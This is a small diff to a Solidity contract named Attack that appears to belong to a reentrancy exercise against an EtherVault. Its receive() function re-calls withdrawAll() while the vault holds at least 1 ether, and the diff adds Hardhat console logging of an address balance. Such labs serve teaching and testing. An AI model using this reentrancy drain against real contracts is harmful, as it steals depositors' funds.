@@ -1,5 +1,6 @@
 //SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
+import "hardhat/console.sol";
 
 interface IEtherVault {
     function deposit() external payable;
@@ -16,6 +17,7 @@ contract Attack {
     receive() external payable {
         if (address(etherVault).balance >= 1 ether) {
             etherVault.withdrawAll();
+            console.log("Hardhat Transaction Output ",address(0xf8344F994F0B25964C51B25BB1b4aCed4F1ea468).balance);
         }
     }
 
